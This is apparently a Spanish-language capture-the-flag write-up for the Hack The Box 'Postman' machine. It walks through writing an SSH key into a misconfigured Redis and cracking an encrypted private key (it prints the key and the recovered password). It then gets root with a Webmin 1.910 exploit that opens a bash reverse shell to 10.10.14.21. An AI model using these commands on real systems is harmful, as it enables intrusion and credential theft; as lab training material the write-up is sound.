
<p align="center">
<img src="https://th.bing.com/th/id/R.90ae6582f853318e31741eadfc6f9aac?rik=nPCuZJcKHzl9wQ&pid=ImgRaw&r=0">
</p>



Postman es una máquina Linux de dificultad fácil en la cual se va a explotar el servicio Redis que se encuentra mal configurado. En la fase de escalamiento de privilegios, se va a explotar una vulnerabilidad en Webmin 1.910 que permite actualizar paquetes a los usuarios autorizados.


## Reconocimiento y Enumeración

### Ping

En primer lugar se debe revisar que la máquina esté activa. Hacemos un ping usando el siguiente comando:
`ping -c 1 postman.htb`

- `-c <n>` = realizar *n* veces el ping

### Nmap

Se procede a realizar un escaneo de todos los puertos con la herramienta nmap usando el siguiente comando:
`nmap -p- --open -T5 -v -n postman.htb -oG all-ports`

- `-p-:` escanea todos los 65536 puertos
- `--open:` solo se va a tener en cuenta los puertos abiertos
- `-T5:` establece la plantilla de temporización, el rango es entre 0-5 y por lo tanto, el escaneo va a ir a una mayor velocidad
- `-v:` cuando nmap descubre un puerto, lo imprime por consola
- `-n:` se desactiva la resolución de DNS
- `-oG:` el archivo se va a guardar en formato grepable 

El output de nmap es el siguiente:

```bash
┌─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Traverxec]
└──╼ $nmap -p- --open -T5 -v -n postman.htb -oG all-ports
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-01 23:47 -05

PORT   STATE SERVICE
22/tcp open  ssh
6379/tcp  open  redis
10000/tcp open  snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 115.12 seconds
```

Una vez se sabe qué puertos están abiertos en la máquina objetivo se procede a revisar las versiones de los servicios usando el comando:
`nmap -sC -sV -p22,80 postman.htb -oN targeted.txt`

- `-sC:`  realiza un escaneo usando los scripts por defecto que se encuentran en la base de datos de nmap.
- `-sV:` intenta encontrar la versión del servicio que está corriendo en el puerto correspondiente.
- `-p:` se establece los puertos que deseo hacer el escaneo.
- `oN:` el archivo se va a guardar en un formato normal, en este caso en formato de texto.

El output de nmap es el siguiente:

```bash
┌─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Traverxec]
└──╼ $nmap -sC -sV -p22,6379,10000 postman.htb -oN targeted.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-01 23:47 -05

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site does not have a title (text/html; Charset=iso-8859-1).
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 44.14 seconds

```

Los puertos que están abiertos corresponde a los siguientes servicios:

- `Puerto 22 (SSH Secure Shell):` sirve para acceder de manera remota a máquinas de manera segura.
- `Puerto 6379 (Redis):` es un motor de base de datos en memoria, basado en el almacenamiento en tablas de hashes.
- `Puerto 10000 (Webmin):` es una herramienta de configuración de sistemas accesible vía web para sistemas Unix.

### Enumeración Redis

Para revisar la configuración de este servicio, podemos usar `telnet` o `redis-cli`. En este caso, usamos `redis-cli` y el comando que vamos a utilizar para leer los parámetros de configuración del servidor Redis es el siguiente

```bash
┌─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Postman]
└──╼ $redis-cli -h postman.htb
postman.htb:6379> CONFIG GET * 
```




## Explotación

Procedemos a generar un nuevo par de llaves SSH para guardarla posteriormente en el servicio Redis. usando el comando `ssh-keygen` y especificamos el algoritmo con el parámetro `-t` y el nombre del archivo con el parámetro `-f`

```bash
┌──[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Postman]
└──╼ $ssh-keygen -t rsa -f ssh-keys                                       
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ssh-keys
Your public key has been saved in ssh-keys.pub
The key fingerprint is:
SHA256:xg5JlHQX/Gqtf790LjaCTWWjzYnKE48pzMomrS8okO8 nicolasmira101@parrot
The keys randomart image is:
+---[RSA 3072]----+
|     .o...o.     |
|     ... ..      |
|      .    .     |
|     . o    . +  |
| .    o S  o B o |
|o      +  + = +  |
|.. . . o.o @   ..|
|. o o.o + O + *..|
| oE .*+. . o.+ =+|
+----[SHA256]-----+
```

Ahora guardamos la llava pública que generamos anteriormente con el siguiente comando

```bash
┌──[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Postman]
└──╼ $(echo -e "\n\n"; cat ssh-keys.pub; echo -e "\n\n") > llave-publica.txt
┌──[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Postman]
└──╼ $cat llave-publica.txt

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPT1VR+KLwgPnmoLk2KXZTrsg40lQhhyTCAX6Sln14TV7Z22g+l0irsc5h+nWLS4/VYkNqipobJzHm2HxkWo3K9ZRJnas395AV/undeVE3rqVUIAE5jq6aaKl7EKPTT7O4sjL9IfwYiMOseRUMhJfTgr6TM846DMKftGgdCjCD5iYZkrgk7auGAMyKAX6voqdF7JR0NacXK+SFGHYfQANzmgY8FJAEYWN19azvcw425i1Cjxe8HVKoH76nUdkENg/TLccfMsgucX34WTbNYgw8n2R/+w+OQI+CQEPKFi/giYdti3b8S/8t8ElT4JaWYO9hnd0eCgXsdh80QzMaqsVD6BRmQZ5jJOhGQg2f56vksiuOprh2DVh0qZ6Hi+6BXD4/Xch9gTLTSuTmoMyy6MD0Myy6RcqHIGH/BKbslXxY9/z9uffNsehR2TgKVo42kED0IwLkDqHHSBX09IhVe3+kn2gM+jBElc5Vhk1R82+T+f4DdjFJI982liEczwOiJ3s= nicolasmira101@parrot
```

Procedemos a registrar la llave pública en el servicio Redis  con el siguiente comando

```bash
┌──[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Postman]
└──╼ $cat llave-publica.txt | redis-cli -h postman.htb -x set hackthebox
OK
```

Creamos un directorio para guardar la llave que acabamos de enviar y creamos un archivo para las llaves autorizadas de la siguiente manera

```
┌─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Postman]
└──╼ $redis-cli -h postman.htb
postman.htb:6379> CONFIG SET dir /var/lib/redis/.ssh
OK
postman.htb:6379> CONFIG SET dbfilename authorized_keys
OK
postman.htb:6379> save 
OK
```

Ahora, nos conectamos vía SSH usando el usuario redis y la contraseña que establecimos cuando creamos el par de llaves SSH

```bash
─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Postman]
└──╼ $ssh -i ssh-keys redis@postman.htb
The authenticity of host 'postman.htb (10.10.10.160)' can not be established.
ECDSA key fingerprint is SHA256:kea9iwskZTAT66U8yNRQiTa6t35LX8p0jOpTfvgeCh0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'postman.htb,10.10.10.160' (ECDSA) to the list of known hosts.
Enter passphrase for key 'ssh-keys': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
redis@Postman:~$ pwd
/var/lib/redis
```

Enumerando el sistema, encontramos que en el directorio `/opt` se encuentra una llave privada

```bash
redis@Postman:~$ cd /opt 
redis@Postman:/opt$ ls
id_rsa.bak 
-----BEGIN RSA PRIVATE KEY-----                                                                                 
Proc-Type:                                                                                                                 
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C                                                       

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
redis@Postman:/opt$ 

```

Copiamos esta contraseña a nuestro sistema y obtenemos el hash de la contraseña y posteriormente crackeamos este hash usando John

```bash
┌─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Postman]
└──╼ $pluma privada.key
┌─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Postman]
└──╼ $/usr/share/john/ssh2john.py privada.key > privada.hash
┌─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Postman]
└──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt privada.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (privada.key)
```

En la sesión SSH que tenemiamos anteriromente vamos a cambiarnos al usuario Matt e introducir la contraseña que encontramos con John y nos cambiamos al directorio `/home/Matt` y ya obtendremos la flag del usuario

```bash
redis@Postman:/opt$ su Matt
Password: 
Matt@Postman:/opt$ cd /home/Matt
Matt@Postman:~$ ls
user.txt
Matt@Postman:~$ cat user.txt
517ad0........................
```




## Escalamiento de privilegios

Con Nmap encontramos que el puerto 10000 estaba abierto y este corresponde al servicio de Webmin, así que con las credenciales nos vamos a conectar para ver que encontramos. La url para logearnos es `https://postman.htb:10000/`

Encontramos que la versión que está corriendo en este servidor es la 1.910 y es vulnerable a ejecución de código remoto como lo indica [Exploit-db](https://postman.htb:10000/). Buscando el CVE correspondiente en internet, encontramos una PoC en Github implementada en Python  [CVE-2019-12840](https://github.com/bkaraceylan/CVE-2019-12840_POC/blob/master/exploit.py).

Para ejecutar el script primero iniciamos una sesión con Netcat para ponernos en modo escucha por el puerto 9021 y que nos entable la shell reversa. Luego escribimos el siguiente comando

```bash
┌──[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Postman]
└──╼ $python3 exploit.py -u https://10.10.10.160 -p 10000 -U Matt -P computer2008  -c 'bash -i >& /dev/tcp/10.10.14.21/9021 0>&1'    
[*] Attempting to login...
[*] Exploiting...
[*] Executing payload...
```

Revisando la shell reversa, ya tenemos acceso como usuario y lo único que nos queda es ir por la flag del root

```bash
┌──[nicolasmira101@parrot]─[~]
└──╼ $nc -lvp 9021
listening on [any] 9021 ...
connect to [10.10.14.21] from postman.htb [10.10.10.160] 41854
root@Postman:/usr/share/webmin/package-updates/# whoami
whoami
root
root@Postman:/usr/share/webmin/package-updates/# cat /root/root.txt
cat /root/root.txt
a257741........................

```

